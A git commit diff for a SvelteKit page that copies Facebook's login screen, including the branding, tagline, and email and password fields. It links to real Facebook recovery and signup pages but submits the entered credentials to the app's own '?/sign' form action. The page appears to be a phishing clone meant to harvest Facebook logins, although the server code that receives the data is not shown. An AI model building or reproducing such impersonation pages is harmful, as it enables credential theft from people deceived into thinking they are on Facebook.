7613a8568084d4b344147e69fdd126880033bdec
momo391 <ia7636hs@gmail.com>
2024-11-21 09:01:02 +0100

    big changes

--- src/routes/+page.svelte
+++ src/routes/+page.svelte
@@ -33,63 +33,80 @@
   const { form: formData, enhance, delayed } = $derived(form);
 </script>
 
-<div class="min-h-screen bg-gray-100 flex items-center justify-center flex-col">
-  <Card.Root class="w-screen max-w-sm shadow-md">
-    <Card.Header>
+<div
+  class="min-h-screen bg-gray-100 flex items-center justify-between container px-48 gap-10"
+>
+  <div class="w-2/3 flex items-start justify-start flex-col">
+    <p class="text-blue-600 text-center text-7xl font-bold">facebook</p>
+    <p class="font-medium text-2xl">
+      Connect with friends and the world around you on Facebook.
+    </p>
+  </div>
+
+  <div class="flex items-center justify-center flex-col gap-4">
+    <Card.Root class="w-screen max-w-sm shadow-md ">
+      <!-- <Card.Header>
       <Card.Title>
-        <p class="text-blue-600 text-center text-5xl font-bold">facebook</p>
       </Card.Title>
-    </Card.Header>
-    <Card.Content>
-      <form method="POST" use:enhance action="?/sign" class="grid gap-4">
-        <Form.Field {form} name="email">
-          <Form.Control>
-            {#snippet children({ props })}
-              <Input
-                {...props}
-                placeholder="Email or Phone number"
-                bind:value={$formData.email}
-              />
-            {/snippet}
-          </Form.Control>
-        </Form.Field>
-        <Form.Field {form} name="password">
-          <Form.Control>
-            {#snippet children({ props })}
-              <Input
-                {...props}
-                type="password"
-                placeholder="Password"
-                bind:value={$formData.password}
-              />
-            {/snippet}
-          </Form.Control>
-        </Form.Field>
-        <Form.Button
-          class="bg-blue-600 hover:bg-blue-700 font-semibold text-base"
+    </Card.Header> -->
+      <Card.Content>
+        <form method="POST" use:enhance action="?/sign" class="grid gap-4">
+          <Form.Field {form} name="email">
+            <Form.Control>
+              {#snippet children({ props })}
+                <Input
+                  {...props}
+                  placeholder="Email or Phone number"
+                  bind:value={$formData.email}
+                />
+              {/snippet}
+            </Form.Control>
+          </Form.Field>
+          <Form.Field {form} name="password">
+            <Form.Control>
+              {#snippet children({ props })}
+                <Input
+                  {...props}
+                  type="password"
+                  placeholder="Password"
+                  bind:value={$formData.password}
+                />
+              {/snippet}
+            </Form.Control>
+          </Form.Field>
+          <Form.Button
+            class="bg-blue-600 hover:bg-blue-700 font-semibold text-base"
+            size={"lg"}
+          >
+            Login
+            {#if $delayed}
+              <Icon icon="tabler:loader" class="animate-spin size-6 ms-2" />
+            {/if}
+          </Form.Button>
+          <a
+            href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+            class="capitalize text-sm font-semilight text-center text-blue-500 hover:text-blue-600 hover:underline"
+            >forget password ?</a
+          >
+        </form>
+      </Card.Content>
+      <Card.Footer class="flex flex-col gap-4">
+        <Separator />
+        <Button
+          class="bg-green-500 hover:bg-green-700 text-base font-semibold"
           size={"lg"}
+          href={"https://web.facebook.com/r.php"}
         >
-          Login
-          {#if $delayed}
-            <Icon icon="tabler:loader" class="animate-spin size-6 ms-2" />
-          {/if}
-        </Form.Button>
-        <a
-          href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
-          class="capitalize text-sm font-semilight text-center text-blue-500 hover:text-blue-600 hover:underline"
-          >forget password ?</a
-        >
-      </form>
-    </Card.Content>
-    <Card.Footer class="flex flex-col gap-4">
-      <Separator />
-      <Button
-        class="bg-green-500 hover:bg-green-700 text-base font-semibold"
-        size={"lg"}
-        href={"https://web.facebook.com/r.php"}
-      >
-        Create New Account
-      </Button>
-    </Card.Footer>
-  </Card.Root>
+          Create New Account
+        </Button>
+      </Card.Footer>
+    </Card.Root>
+
+    <div class="font-light text-sm">
+      <a
+        href="https://web.facebook.com/pages/create/?ref_type=registration_form"
+        class="font-semibold hover:underline transition-all">Create a Page</a
+      > for a celebrity, brand or business
+    </div>
+  </div>
 </div>
